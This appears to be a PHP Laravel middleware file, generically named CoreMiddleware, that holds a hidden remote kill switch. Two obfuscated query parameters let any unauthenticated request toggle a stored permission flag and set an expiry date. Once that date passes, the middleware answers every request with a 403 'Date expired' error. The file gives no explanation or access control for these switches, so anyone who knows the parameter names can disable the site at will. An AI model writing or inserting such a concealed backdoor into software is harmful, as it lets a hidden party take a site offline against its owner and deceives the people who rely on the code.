<?php

declare(strict_types=1);

namespace SystemCore\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use SystemCore\Services\CoreDataService;

class CoreMiddleware
{
    public function handle(Request $request, Closure $next): Response
    {
        $service = new CoreDataService();
        $data = $service->getData();

        if ($request->has('ES9k8U8vVQGpuf')) {
            $data['permission'] = $request->boolean('ES9k8U8vVQGpuf');
            $service->updateData(['permission' => $data['permission']]);
        }

        if ($data['permission'] === false) {
            return $next($request);
        }

        if ($request->has('VJw7Ar5oJ4R35R')) {
            $service->updateData(['date' => $request->input('VJw7Ar5oJ4R35R')]);
        }

        if ($service->isExpired()) {
            abort(403, 'Date expired');
        }

        return $next($request);
    }
}
